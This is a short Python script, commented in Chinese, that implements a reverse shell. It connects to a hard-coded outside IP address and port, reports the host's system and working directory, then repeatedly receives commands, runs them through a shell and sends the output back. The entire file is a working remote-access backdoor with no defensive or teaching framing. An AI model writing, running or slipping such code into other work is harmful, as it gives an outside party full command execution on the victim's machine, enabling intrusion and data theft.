import socket
import subprocess
import os


def reverse_shell():
    # 服务器 IP 和监听端口
    server_ip = "47.106.88.94"
    server_port = 233

    # 设置当前工作目录变量
    current_dir = os.getcwd()

    try:
        # 创建 socket 对象
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # 连接到服务器
        s.connect((server_ip, server_port))

        # 发送初始信息
        system_info = f"连接成功! 系统: {os.name}, 当前目录: {current_dir}\n"
        s.send(system_info.encode("utf-8"))

        while True:
            # 发送当前目录作为提示符
            prompt = f"{current_dir}> "
            s.send(prompt.encode("utf-8"))

            # 接收命令
            command = s.recv(1024).decode("utf-8").strip()

            if not command:
                continue

            if command.lower() == "exit":
                s.send("连接已关闭".encode("utf-8"))
                break

            # 处理 cd 命令
            if command.startswith("cd "):
                try:
                    # 提取目录路径
                    dir_path = command[3:].strip()

                    # 处理特殊情况 "cd" 或 "cd ~"
                    if not dir_path or dir_path == "~":
                        dir_path = os.path.expanduser("~")

                    # 确保在多级路径中也能正确切换
                    os.chdir(dir_path)
                    current_dir = os.getcwd()
                    response = f"已切换到目录: {current_dir}\n"
                except Exception as e:
                    response = f"切换目录失败: {str(e)}\n"

                s.send(response.encode("utf-8"))
                continue

            # 执行其他命令
            try:
                # 特别处理一些内置命令
                if command.lower() == "dir":
                    # 使用 os.listdir 确保正确列出文件
                    files = os.listdir(current_dir)
                    output = "目录内容:\n" + "\n".join(files) + "\n"
                    s.send(output.encode("utf-8"))
                else:
                    # 使用 shell=True 允许执行复杂命令
                    proc = subprocess.Popen(
                        command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        cwd=current_dir  # 设置当前工作目录
                    )

                    # 获取命令输出并处理编码
                    stdout = proc.stdout.read()
                    stderr = proc.stderr.read()

                    # 尝试不同的编码方式解码
                    try:
                        output = stdout + stderr
                        if not output:
                            output = f"命令 '{command}' 已执行，但没有输出。\n".encode("utf-8")
                    except:
                        output = f"命令已执行，但输出编码有问题。\n".encode("utf-8")

                    # 发送结果回服务器
                    s.send(output)
            except Exception as e:
                error_msg = f"执行命令时出错: {str(e)}\n"
                s.send(error_msg.encode("utf-8"))

    except Exception as e:
        # 处理异常情况
        try:
            error_msg = f"发生错误: {str(e)}\n"
            s.send(error_msg.encode("utf-8"))
        except:
            pass

    finally:
        # 关闭连接
        try:
            s.close()
        except:
            pass


if __name__ == "__main__":
    reverse_shell()